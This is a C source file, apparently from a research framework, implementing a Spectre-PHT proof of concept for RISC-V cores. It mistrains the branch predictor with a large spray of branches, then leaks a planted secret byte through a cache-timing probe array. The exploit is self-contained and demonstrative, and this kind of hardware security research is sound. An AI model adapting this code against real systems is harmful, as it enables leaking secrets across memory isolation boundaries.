#include <stddef.h>
size_t CACHE_MISS = 0;
#include "../../../exploit_framework.h"

// PHT sa-oop: out-of-place training via branch spray
// Many taken branches bias global PHT, victim branch mispredicts

// Platform-specific tuning: P550 needs interleaved spray+attack pattern
#ifdef P550
#define MISTRAIN_REPS 5
#define ATTACK_REPS 200
#else
#define MISTRAIN_REPS 10
#define ATTACK_REPS 1
#endif

#define BENIGN_SIZE PAGE_SIZE

volatile int buf_size = BENIGN_SIZE;
uint8_t* probe_array;

struct evset_pages {
    uint8_t page_barrier1[PAGE_SIZE];
    uint8_t victim[PAGE_SIZE];
    uint8_t page_barrier2[PAGE_SIZE];
    uint8_t secret_data[PAGE_SIZE];
    uint8_t page_barrier3[PAGE_SIZE];
} __attribute__((aligned(PAGE_SIZE))) evset_pages;

uint8_t *const page_barrier1 = evset_pages.page_barrier1;
uint8_t *const victim        = evset_pages.victim;
uint8_t *const page_barrier2 = evset_pages.page_barrier2;
uint8_t *const secret_data   = evset_pages.secret_data;
uint8_t *const page_barrier3 = evset_pages.page_barrier3;

// Branch spray macros for PHT out-of-place training
volatile int spray_cond = 1;
#define BEQ asm volatile("beq %0, %1, 1f\n1:" : : "r"(spray_cond), "r"(1));
#define BEQ_16 BEQ BEQ BEQ BEQ BEQ BEQ BEQ BEQ BEQ BEQ BEQ BEQ BEQ BEQ BEQ BEQ
#define BEQ_256 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16 BEQ_16
#define BEQ_4K BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256 BEQ_256

void oop_mistrain() {
    if(spray_cond) spray_cond++;
    BEQ_4K
}

void __attribute__((noinline)) victim_function(int idx) {
    if (idx >= 0 && idx < STALL(buf_size)) {
        SPEC_FENCE();
        maccess(probe_array + victim[idx] * PAGE_SIZE);
    }
}

typedef struct {
    int secret_offset;
#ifdef CACHEUTILS_USE_EVICTION
    eviction_set_t buf_size_set;
#endif
} pht_sa_oop_data_t;

void pht_sa_oop_setup(exploit_ctx_t* ctx, void* data) {
    pht_sa_oop_data_t* pht_data = (pht_sa_oop_data_t*)data;

    memset(victim, 0x01, PAGE_SIZE);
    memset(page_barrier1, 0x01, PAGE_SIZE);
    memset(page_barrier2, 0x01, PAGE_SIZE);
    memset(page_barrier3, 0x01, PAGE_SIZE);
    memset(secret_data, 0xFF, PAGE_SIZE);

    pht_data->secret_offset = secret_data - victim;

#ifdef CACHEUTILS_USE_EVICTION
    if (build_eviction_set_vaddr((void*)&buf_size, &pht_data->buf_size_set) != 0) {
        fprintf(stderr, "Failed to build eviction set for buf_size\n");
        exit(1);
    }
    printf("buf_size eviction set: %d addresses\n", pht_data->buf_size_set.num_addrs);
#endif
}

void pht_sa_oop_attack(exploit_ctx_t* ctx, void* data, uint8_t encode_index) {
    pht_sa_oop_data_t* pht_data = (pht_sa_oop_data_t*)data;

    secret_data[0] = encode_index;

    // Interleaved spray+attack pattern (P550 uses many reps, C910 uses 1)
    for (int a = 0; a < ATTACK_REPS; a++) {
        // PHT out-of-place training via branch spray
        for (int j = 0; j < MISTRAIN_REPS; j++) {
            oop_mistrain();
        }

#ifdef CACHEUTILS_USE_EVICTION
        evict_with_set(&pht_data->buf_size_set);
#else
        flush((void*)&buf_size);
#endif
        mfence();

        victim_function(pht_data->secret_offset);
    }
}

int main() {
    exploit_ctx_t ctx = {0};
    pht_sa_oop_data_t pht_data = {0};

    if (exploit_init(&ctx) != 0) return 1;
    probe_array = ctx.probe_array;

    printf("Spectre-PHT sa-oop\n");

    exploit_hooks_t hooks = {
        .setup = pht_sa_oop_setup,
        .attack = pht_sa_oop_attack,
        .cleanup = NULL
    };

    exploit_run(&ctx, &hooks, &pht_data);
    exploit_print_results("PHT same-address out-of-place", &ctx);
    exploit_cleanup(&ctx);
    return 0;
}
